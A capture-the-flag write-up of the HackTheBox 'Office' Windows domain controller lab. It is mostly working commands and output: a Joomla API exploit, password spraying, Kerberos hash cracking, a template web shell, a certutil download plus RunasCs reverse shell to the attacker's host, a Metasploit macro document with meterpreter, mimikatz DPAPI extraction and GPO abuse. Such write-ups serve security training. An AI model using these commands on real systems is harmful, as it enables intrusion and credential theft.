---
layout: page
title:  "Office (Hard)"
seo_title: "Writeup for the HackTheBox Office Machine"
date:   2024-07-16T15:00
categories: ['HackTheBox', 'Active-Directory', 'Windows']
---

![](/assets/images/headers/Office.png)

# Synopsis

The "Office" machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities. These include exploiting a Joomla web application, analyzing PCAP files to extract Kerberos credentials, leveraging LibreOffice macros by manipulating registry settings, abusing MSKRP to dump DPAPI credentials, and exploiting Group Policies due to excessive privileges in Active Directory.

## Reconnaissance
The initial phase begins with an `nmap` scan, revealing that the target is a Windows Domain Controller.

```console
$ nmap -p- 10.10.11.3
Nmap scan report for 10.10.11.3
Host is up (0.015s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49675/tcp open  unknown
49680/tcp open  unknown
55563/tcp open  unknown
```

The domain being used is `office.htb` and the Domain Controller is called `DC` so we can add those to our `/etc/hosts` file.

```console
$ echo 10.10.11.3 office.htb dc.office.htb | sudo tee -a /etc/hosts
```

### Joomla Website
On accessing the website, we encounter a Joomla CMS for "Tony Stark's Iron Man Company". By checking the version, we identify it as `4.2.7`, which is vulnerable to a known exploit (`CVE-2023-23752`).

![Joomla Version](/assets/images/writeups/office/joomla-version.png)

We find a PoC script for `CVE-2023-23752` on [GitHub](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT). Running the exploit provides us with a username and password.

```console
$ python CVE-2023-23752.py -u http://10.10.11.3
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Checking if target is vulnerable
[+] Target is vulnerable
[*] Launching exploit against: http://10.10.11.3
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
[+] Target is vulnerable for usernames
[+] Gathering username(s) for: http://10.10.11.3
[+] Username: Administrator
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for passwords at path: /api/index.php/v1/config/application?public=true
[+] Target is vulnerable for passwords
[+] Gathering password(s) for: http://10.10.11.3
[+] Password: H0lOgrams4reTakIng0Ver754!
```
Trying to login as the `Administrator` account on the Joomla backend fails. Looking at the endpoint where this password was found, it looks like this is the password for the Joomla database, so for now we proceed.

### Domain Enumeration
With port `88` open, we proceed to enumerate domain usernames using `kerbrute`, successfully identifying several valid accounts.

```console
$ kerbrute userenum -d office.htb --dc 10.10.11.3 jsmith.txt
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/16/24 - Ronnie Flathers @ropnop

2024/07/16 09:52:36 >  Using KDC(s):
2024/07/16 09:52:36 >  	10.10.11.3:88

2024/07/16 09:52:41 >  [+] VALID USERNAME:	 ewhite@office.htb
2024/07/16 09:52:54 >  [+] VALID USERNAME:	 dmichael@office.htb
2024/07/16 09:52:56 >  [+] VALID USERNAME:	 dwolfe@office.htb
2024/07/16 09:53:01 >  [+] VALID USERNAME:	 tstark@office.htb
2024/07/16 09:53:54 >  [+] VALID USERNAME:	 hhogan@office.htb
2024/07/16 09:54:00 >  [+] VALID USERNAME:	 ppotts@office.htb
```
We found 6 usernames from the `jsmith` wordlist and add them to our `ad_users.txt` list. 

## Foothold
### Access as Dwolfe
By performing a password spraying attack using [NetExec](https://github.com/Pennyw0rth/NetExec) we gain access to the domain with the `dwolfe` account. 

```console
$ cat ad_users.txt
Administrator
ewhite
dmichael
dwolfe
tstark
hhogan
ppotts

$ nxc smb office.htb -u ad_users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\ppotts:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

We explore the accessible shares, discovering a PCAP file that holds valuable information.

```console
$ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.11.3:445	Name: office.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SOC Analysis                                      	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
[*] Closed 1 connections
```

The user `dwolfe` has access over the `SOC Analysis` share and can connect to the share using `smbclient`.

```console
$ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
# use SOC Analysis
# mget *
[*] Downloading Latest-System-Dump-8fbc124d.pcap
```

The share contains a `PCAP` file, so lets inspect this further with WireShark. We start by showing the `Protocol Hierarchy` and notice there are several frames for the `Kerberos` protocol.

![PCAP Protocol Hierarchy](/assets/images/writeups/office/pcap-kerberos.png)

Filtering the packets on the Kerberos protocol we notice an NTLM authentication session using SMB, which transmits an `AS-REQ`. In the second AS-REQ packet, we have a hashed timestamp. We can use this information to attempt to crack the password of the user that tried to authenticate.

![PCAP Kerberos As-Req](/assets/images/writeups/office/pcap-kerberos-req.png)

We can create a `Kerberos Pre-Auth` hash for the user `tstark`. To do this we first have to check the format that is expected by [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

![Hashcat kerberos example](/assets/images/writeups/office/kerberos-preauth-format.png)

We can now reconstruct the hash and crack it.

```console
$ hashcat -m 19900 tstark.hash $ROCKYOU

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69

<SNIP>
```

We found the credentials to be `tstark:playboy69`. 

## Lateral Movement
### Access as TStark (User)
We found that `tstark` is also the administrator user for the Joomla backend so we can login with the following credentials: `Administrator:playboy69`. Next we can go to `System > Site Templates` and select the available template. We can then add a web shell on one of the available pages (e.g. `error.php`) to get remote code execution.

![Joomla RCE](/assets/images/writeups/office/joomla-rce.png)

We test if we can get remote code execution with the following command:
```console
$ curl http://10.10.11.3/templates/cassiopeia/error.php?bashee=whoami
office\web_account
```

Looks like we have command execution, so lets try to get a reverse shell. We can try to get a shell as `tstark` directly by using [RunasCs.exe](https://github.com/antonioCoco/RunasCs) since we know the password of this user on the machine. We will start a Python webserver on our host and run the following commands to download our executable and get a shell.

```bash
certutil -f -urlcache http%3A%2F%2F10.10.14.7%3A8888%2FRunasCs.exe RunasCs.exe

.%5CRunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.7%3A4444
```

We start a `pwncat` listener to catch our shell. Afterwards we get a shell as `tstark` and can get the user flag.
```console
$ pwncat-cs -m windows -lp 4444
(remote) tstark@DC:C:\Windows\system32$ cd C:\Users\tstark\Desktop
(remote) tstark@DC:C:\Users\tstark\Desktop$ dir
Directory: C:\Users\tstark\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/16/2024  12:58 PM             34 user.txt
```

### Access as PPotts
Looking at the installed applications, we notice `LibreOffice 5` is installed.

```console
(remote) tstark@DC:C:\Program Files$ dir
Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:58 AM                Common Files
d-----         1/25/2024  12:20 PM                Internet Explorer
d-----         1/17/2024   1:26 PM                LibreOffice 5
d-----          5/2/2023   5:22 PM                Microsoft OneDrive
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----         4/14/2023   3:22 PM                Npcap
d-----         4/12/2023   4:30 PM                Oracle
d-----         2/14/2024   2:18 AM                VMware
d-----         4/17/2023   3:35 PM                Windows Defender
d-----         1/25/2024  12:20 PM                Windows Defender Advanced Threat Protection
d-----         1/25/2024  12:20 PM                Windows Mail
d-----         1/25/2024  12:20 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
d-----         4/14/2023   3:23 PM                Wireshark
```
Older versions of `LibreOffice` usually have vulnerabilities that allow for code execution if a user opens a malicious document. To find the exact version we can execute the following command.

```console
(remote) tstark@DC:C:\Users\tstark\Desktop$ wmic product get name
Name
Office 16 Click-to-Run Extensibility Component
Office 16 Click-to-Run Licensing Component
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332
LibreOffice 5.2.6.2
DefaultPackMSI
VMware Tools
Teams Machine-Wide Installer
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133
Microsoft Search in Bing
``` 

Looking further we also find an internal website. Quickly looking at the source code seems like we can upload a resume, but we cannot find this to be a public facing website.

```console
(remote) tstark@DC:C:\xampp\htdocs\internal$ ls
Directory: C:\xampp\htdocs\internal

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/14/2024   5:35 PM                applications
d-----          5/1/2023   4:27 PM                css
d-----          5/1/2023   4:27 PM                img
-a----         1/30/2024   8:38 AM           5113 index.html
-a----         1/30/2024   8:40 AM           5282 resume.php
```

After looking a bit further, we can find a virtual host configuration in `C:\xampp\apache\conf\httpd.conf`. It looks like the internal website is running on port `8083`.

```
#Listen 12.34.56.78:80
Listen 80
Listen 8083

<VirtualHost *:8083>
    DocumentRoot "C:\xampp\htdocs\internal"
    ServerName localhost:8083

    <Directory "C:\xampp\htdocs\internal">
        Options -Indexes +FollowSymLinks +MultiViews
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog "logs/myweb-error.log"
    CustomLog "logs/myweb-access.log" combined
</VirtualHost>
```

We can try to access the internal website by uploading a [Chisel](https://github.com/jpillora/chisel) agent on the host.

```console
(local) pwncat$ upload /home/s3rp3nt/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
(remote) tstark@DC:C:\Users\tstark$ .\c.exe client 10.10.14.7:8000 R:8083:127.0.0.1:8083

$ ./chisel_1.9.1_linux_amd64 server --port 8000 --reverse
```

We can now access the internal website by browsing to `http://127.0.0.1:8083` and we also find the page where we can upload a resume.

![Web form resume upload](/assets/images/writeups/office/resume-upload.png)

Looking back at the source code, we are only allowed to upload Word documents that are smaller than 5Mb in size. When trying to create a `.odt` document with a Macro, we can't actually execute it on the machine. This means that there might be some extra protections in place.

### Reduce Macro Security
According to the [LibreOffice Wikipedia](https://wiki.documentfoundation.org/Deployment_and_Migration#Windows_Registry), there are registry values that can be used to control the
security of the application. We can search for the `MacroSecurityLevel` registry key that shows the current settings.

```console
(remote) tstark@DC:C:\$ Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel"
Value        : 3
Final        : 1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

The value is set to `3`, which means it's set to High Security level. We need to find a way to change this value to allow our macros to trigger. The ACLs on this key show that the `Registry Editors` group has `FullControl` and lucky for us we are also part of this group.

```console
(remote) tstark@DC:C:\$ $key = "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting"
(remote) tstark@DC:C:\$ (Get-Acl $key).Access
RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : OFFICE\Registry Editors
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

(remote) tstark@DC:C:\$ whoami /groups
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

So we are able to update the `MacroSecurityLevel` key.

```console
(remote) tstark@DC:C:\$ Set-ItemProperty -Path "$key\MacroSecurityLevel" -Name "Value" -Value 0
```

We can now create a document with a malicious macro with MetaSploit.

```console
msf6 > use exploit/multi/misc/openoffice_document_macro
msf6 exploit(multi/misc/openoffice_document_macro) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/misc/openoffice_document_macro) > set LHOST 10.10.14.7
msf6 exploit(multi/misc/openoffice_document_macro) > run
[*] Started reverse TCP handler on 10.10.14.7:4444
[*] Using URL: http://10.10.14.7:8080/PvPe6N5kOKQ
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[*] Packaging file: meta.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging file: styles.xml
[+] msf.odt stored at /home/s3rp3nt/.msf4/local/msf.odt
```

Next we upload the generated file to the server and wait for the macro to get executed. This may take a minute or two.

```console
[*] 10.10.11.3       openoffice_document_macro - Sending payload
[*] Sending stage (201798 bytes) to 10.10.11.3
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.11.3:64661) at 2024-07-16 15:02:50 +0200
msf6 exploit(multi/misc/openoffice_document_macro) > sessions

Active sessions
===============

  Id  Name  Type                     Information         Connection
  --  ----  ----                     -----------         ----------
  1         meterpreter x64/windows  OFFICE\ppotts @ DC  10.10.14.7:4444 -> 10.10.11.3:64661 (10.10.11.3)

msf6 exploit(multi/misc/openoffice_document_macro) > sessions 1
meterpreter > getuid
Server username: OFFICE\ppotts
```

### Access as HHogan
After getting a shell as the user `ppotts` we can start to do some pillaging and look for any saved credentials on the current account. Executing `cmdkey /list` reveals there is also a saved credential for the user `HHogan`. Looking at the privileges of this user, we see that this account is part of the `Remote Management Users` group.

```console
PS C:\Users\PPotts> cmdkey /list
Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan

PS C:\Users\PPotts> net user hhogan
User name                    HHogan
Full Name 
<SNIP>
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers 
```

This means that if we are able to recover the credentials of this account, we can most likely connect over WinRM. To get these credentials we can use DPAPI. The DPAPI credential files are decrypted using the user's password, and can be decrypted with the master key or the domain key in case we have access as a domain administrator.

```console
PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Credentials
Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```

## Root
We see three protected files and to be able to extract any data from them we need the master key.

```console
PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Protect
Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
-a-hs-          5/2/2023   4:13 PM             24 CREDHIST
-a-hs-         1/17/2024   4:06 PM             76 SYNCHIST

PS C:\Users\PPotts> gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
-a-hs-         7/16/2024  12:59 PM            740 dd51073f-efb9-463b-a892-31cfafe2feb4
-a-hs-         7/16/2024  12:59 PM             24 Preferred
```

### Mimikatz Credential Extraction
In order to get the secret out of these blobs we would normally need to know the user's password. However, since we are logged in we can query the Domain Controller to retrieve the secrets for us. Since we own the
master credentials associated with our own account, we can abuse this component by using the `/rpc` flag in Mimikatz. We will first upload a copy of `mimikatz.exe` and run it to extract the master key.

```console
PS C:\Users\Public> .\mimikatz.exe "dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit"

 .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

<SNIP>

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77

mimikatz(commandline) # exit
Bye!
```

The second blob is the correct one (oldest date) and we can find the master key at the bottom. We can then decrypt the blobs using this master key and find a password in the second credential blob.

```console
PS C:\Users\Public> .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"

<SNIP>

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

mimikatz(commandline) # exit
Bye!
```

### GPO Abuse
With the found DPAPI credentials we can now get a WinRM session with the user `HHogan`. This user is a member of the `GPO Managers` group and there are a few GPOs in the domain.

```console
$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
*Evil-WinRM* PS C:\Users\HHogan\Documents> Get-GPO -All | Select-Object DisplayName

DisplayName
-----------
Windows Firewall GPO
Default Domain Policy
Default Active Directory Settings GPO
Default Domain Controllers Policy
Windows Update GPO
Windows Update Domain Policy
Software Installation GPO
Password Policy GPO
```

We can assume that this user can edit GPOs (this can be confirmed by running BloodHound). GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. We can use a tool [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) in order to create a Policy that adds us as a local admin.

```console
*Evil-WinRM* PS C:\Programdata> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName "Windows Firewall GPO"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Windows Firewall GPO" is: {04FE5C75-0078-4D44-97C5-8A796BE906EC}
Access to the path '\\office.htb\SysVol\office.htb\Policies\{04FE5C75-0078-4D44-97C5-8A796BE906EC}\Machine\Microsoft\Windows NT\SecEdit\' is denied.[!] 
Exiting...
```

The first policy fails, so lets try to use the second one.

```console
*Evil-WinRM* PS C:\Programdata> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName "Default Domain Policy"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```
This doesn’t take effect until the GPO refreshes, but we are allowed to run `gpupdate /force`. Afterwards we need to exit our current WinRM session and authenticate again for the changes to take effect. We can then see ourselves in the `BUILTIN\Administrators` group and can access the Administrator desktop.

```console
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/16/2024  12:58 PM             34 root.txt
```
